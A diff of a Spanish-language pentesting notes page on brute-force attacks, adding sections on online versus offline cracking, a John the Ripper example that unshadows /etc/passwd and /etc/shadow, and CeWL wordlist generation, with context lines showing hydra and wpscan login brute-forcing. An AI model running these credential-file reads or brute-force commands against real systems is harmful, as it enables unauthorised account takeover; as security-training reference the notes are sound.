@@ -1,6 +1,6 @@
 ---
 layout: article
-title: Pentesting - Ataques de fuerza bruta
+title: Pentesting - Fuerza bruta
 aside:
   toc: true
 sidebar:
@@ -10,7 +10,16 @@ header:
   background: black
 ---
 
-<h1>Fuerza bruta a servicios</h1>
+Existen dos categorías principales de este tipo de ataques, aquellos que se hacen vía internet (**online**) y aquellos en los que no necesitamos realizar peticiones contra el servidor (máquina víctima) para descubrir la contraseña (**offline**), puesto que contamos con la contraseña encriptada/hasheada y tratamos de obtener la contraseña en plano desde nuestra máquina atacante.
+
+<h1>Fuerza bruta vía online</h1>
+
+Limitaciones:
+* Sistemas de seguridad.
+* Ancho de banda y capacidad de procesamiento (asimilación de la cantidad de peticiones).
+* Configuración del servidor.
+* Generación de registros en la máquina víctima (no es muy disimulado que digamos...).
+* No se tiene control del resultado.
 
 <h2><b>Hydra</b></h2>
 
@@ -89,14 +98,27 @@ hydra -C /usr/share/seclist/Passwords/Default-Credentials/tomcat-betterdefaultpa
 wpscan --url http://192.168.1.100/wp --passwords=passwords.txt --usernames admin -t 20​
 ~~~
 
-<h1>Misc</h1>
+<h1>Fuerza bruta vía offline</h1>
+
+<div class="grid">
+  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">John the Ripper</div>
+</div>
+
+Cracking de contraseñas en sistemas linux:
+
+~~~bash
+unshadow /etc/passwd /etc/shadow > unshadow.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --fork=20 unshadow.txt
+~~~
+
+<h1>Generación de diccionarios</h1>
 
 <div class="grid">
   <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">CeWL</div>
 </div>
 [https://github.com/digininja/CeWL.git](https://github.com/digininja/CeWL.git)
 
-Generador de wordlists que recopila palabras clave de las URL del objetivo (spider del target). Esta lista puede ser utilizada como diccionario para logins en aplicaciones web.
+Generador de wordlists que recopila palabras clave de las URL del objetivo (spider del objetivo). Esta lista puede ser utilizada como diccionario para logins en aplicaciones web.
 
 ~~~bash
 ./cewl example.com -d 1 -w example-keywords.txt
